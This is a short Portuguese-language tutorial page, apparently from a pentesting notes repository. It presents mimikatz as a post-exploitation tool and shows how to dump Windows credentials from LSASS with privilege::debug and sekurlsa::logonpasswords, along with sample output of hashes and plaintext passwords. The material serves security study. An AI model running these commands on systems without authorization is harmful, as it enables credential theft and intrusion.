<img width="30%" src="https://i.imgur.com/ULwPfn3.png"></img>

# mimikatz
O [mimikatz](https://github.com/gentilkiwi/mimikatz) é uma ferramenta que vai te auxiliar na sua post-exploitation. Ele tem alguns modules/commands pra te adiantar muito, e foi implementado até no meterpreter do metasploit. Vou dar um exemplo de uma utilidade do mimikatz a seguir.<br>

### about mimikatz
o mimikatz começou como um dll injector chamado `kdll`. Depois foi implementado um Pass-The-Hash e foi renomeado para `kdllpipe`. Mais implementações foram sendo feitas até se tornar o mimikatz que hoje é comumente usado.<br>

# password dump
Vamos começar agora a demonstração. Após conseguir `nt/auth`, você pode utilizar o module `sekurlsa` para extrair diversas informações do `lsass (local security authority subsystem service)`, um handle do windows para alocar passwords e tickets. Caso você não seja nt/auth, ao tentar extrair alguma coisa com esse module, você vai se deparar com o seguinte erro: `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)`.<br><br>

O comando usado para fazer a extração é o `logonpasswords`. Ao utilizar esse comando, seu resultado deve ser algo como:<br>
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
Authentication Id : 0 ; x (00000000:000157e6)
Session           : Interactive from x
User Name         : x
Domain            : x-PC
SID               : x-x-x-x
        msv :
         [00000003] Primary
         * Username : x
         * Domain   : x-PC
         * LM       : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
         * NTLM     : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
         * SHA1     : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
        tspkg :
         * Username : x
         * Domain   : x-PC
         * Password : mypassword
        wdigest :
         * Username : x
         * Domain   : x-PC
         * Password : mypassword
        kerberos :
         * Username : x
         * Domain   : x-PC
         * Password : mypassword
        ssp :
         * Username : x
         * Domain   : x-PC
         * Password : mypassword
        credman :
         * Username : x
         * Domain   : x-PC
         * Password : mypassword

```
---
<br>
[pwn](README.md)<br>
[home](../README.md)
